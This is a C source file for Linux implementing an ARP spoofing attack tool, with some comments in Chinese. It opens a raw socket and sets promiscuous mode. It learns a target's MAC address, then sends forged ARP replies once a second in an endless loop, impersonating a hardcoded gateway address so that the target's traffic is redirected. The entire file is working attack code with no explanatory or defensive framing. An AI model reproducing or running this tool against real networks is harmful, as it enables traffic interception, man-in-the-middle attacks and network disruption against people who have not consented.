#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <netdb.h> 
#include <sys/socket.h> 
#include <sys/types.h> 
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <net/if.h>
#include <errno.h>
#include <features.h>    /* for the glibc version number */
#if __GLIBC__ >= 2 && __GLIBC_MINOR >= 1
    #include <netpacket/packet.h>
    #include <net/ethernet.h>     /* the L2 protocols */
#else
    #include <asm/types.h>
    #include <linux/if_packet.h>
    #include <linux/if_ether.h>   /* The L2 protocols */
#endif
#include <netinet/if_ether.h>

#define IP_LEN 4
#define MAC_LEN 6
#define MAC_BCAST_ADDR  (uint8_t *) "\xff\xff\xff\xff\xff\xff"
#define GATEWAY "192.168.163.2"

static void set_promiscuous(int fd, char *dev);
static int get_ifi(int fd, char *dev, char *mac, struct in_addr *ip_addr);

int main(int argc, char *argv[])
{
    if(argc != 3){
            fprintf (stderr, "usage: %s <interface> <ip_target>\n", argv[0]);
            exit(0);
    }
    // check if root
    if (geteuid() || getuid()) {
        printf("ERROR: You must be root to use this utility\n");
        exit(1);
    }

    int sfd, len;
    u_char *mac;
    char recv_buf[60];
    struct in_addr ip_addr;
    struct sockaddr_ll sl;
    struct arp_pkt{
        struct ether_header eh;
        struct ether_arp ea;
        u_char padding[18];
    }arp;

    /*open sock_raw*/
    if((sfd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0){
        perror("socket");
        exit(2);
    }

    /*set_promiscuous mode*/
    set_promiscuous(sfd, argv[1]);

    /*get my ip and mac*/
    mac = (char *)malloc(MAC_LEN);
    if(get_ifi(sfd, argv[1], mac, &ip_addr)){
        close(sfd);
        exit(0);
    }

    memset(&arp, 0, sizeof(arp));
    /* 填寫以太網頭部*/
    memcpy(arp.eh.ether_dhost, MAC_BCAST_ADDR, MAC_LEN);
    memcpy(arp.eh.ether_shost, mac, MAC_LEN);
    arp.eh.ether_type = htons(ETHERTYPE_ARP);
    /* 填寫arp數據 */
    arp.ea.arp_hrd = htons(ARPHRD_ETHER);
    arp.ea.arp_pro = htons(ETHERTYPE_IP);
    arp.ea.arp_hln = MAC_LEN;
    arp.ea.arp_pln = IP_LEN;
    arp.ea.arp_op = htons(ARPOP_REQUEST);
    memcpy(arp.ea.arp_sha, mac, MAC_LEN);
    memcpy(arp.ea.arp_spa, &ip_addr, IP_LEN);
    memset(&arp.ea.arp_tha, 0, MAC_LEN);
    inet_aton(argv[2], arp.ea.arp_tpa);
    memset(&arp.padding, 0, sizeof(arp.padding));
    
    sl.sll_family = PF_PACKET;
    sl.sll_ifindex = if_nametoindex(argv[1]);

    if((len = sendto(sfd, &arp, sizeof(arp), 0, (struct sockaddr*)&sl, sizeof(sl))) <= 0 ){
        perror("sendto request");
        close(sfd);
        exit(1);
    }
    printf("Broadcast arp request of %s, %d bytes be sent\n", argv[2], len);
    memset(recv_buf, 0, sizeof(recv_buf));
    if((len = recvfrom(sfd, recv_buf, sizeof(arp), 0, NULL, 0)) <= 0 ){
        perror("recvfrom reply");
        close(sfd);
        exit(1);
    }
    printf("Recv arp reply of %s, %d bytes be sent\n", argv[2], len);

    /*check arp is reply and from ip(argv[2])*/
    if( ntohs(*(__be16 *)(recv_buf + 20))==2 && !memcmp(arp.ea.arp_tpa, recv_buf + 28, 4) ){
        memcpy(arp.eh.ether_dhost, (u_char *)(recv_buf + 22), MAC_LEN);
        arp.ea.arp_op = htons(ARPOP_REPLY);
        inet_aton(GATEWAY, arp.ea.arp_spa);
        memcpy(arp.ea.arp_tha, (u_char *)(recv_buf + 22), MAC_LEN);

        while(1){
            if((len = sendto(sfd, &arp, sizeof(arp), 0, (struct sockaddr*)&sl, sizeof(sl))) <= 0 ){
                perror("sendto request");
                close(sfd);
                exit(1);
            }
            printf("Send arp spoofing to %s, %d bytes be sent\n", argv[2], len);
            sleep(1);
        }   
    }

    free(mac);
    close(sfd);
    return 0;
}

static void set_promiscuous(int fd, char *dev){
    struct ifreq if_info; //網絡接口結構
    strcpy(if_info.ifr_name, dev);
    if(ioctl(fd, SIOCGIFFLAGS, &if_info) == -1){ //獲取網絡接口
        perror("ioctl SIOCGIFFLAGS");
        close(fd);
        exit(-1);
    }
    /*此處用 | 是因為必須在保留原來設置的情況下，在標誌位中加入「混雜」方式*/ 
    if_info.ifr_flags |= IFF_PROMISC;
    if(ioctl(fd, SIOCSIFFLAGS, &if_info) == -1){ //將標誌位設置寫入
        perror("ioctl SIOCSIFFLAGS");
        close(fd);
        exit(-1);
    }
}

static int get_ifi(int fd, char *dev, char *mac, struct in_addr *ip_addr){
    struct ifreq if_info;
    strcpy(if_info.ifr_name, dev);
    if(ioctl(fd, SIOCGIFHWADDR, &if_info) == -1){
        perror("ioctl SIOCGIFHWADDR");
        return 1;
    }
    memcpy(mac , &if_info.ifr_hwaddr.sa_data, MAC_LEN);
    if(ioctl(fd, SIOCGIFADDR, &if_info) == -1){
        perror("ioctl SIOCGIFADDR");
        return 1;
    }
    memcpy(ip_addr, &((struct sockaddr_in*)(&if_info.ifr_addr))->sin_addr, IP_LEN);
    return 0;
}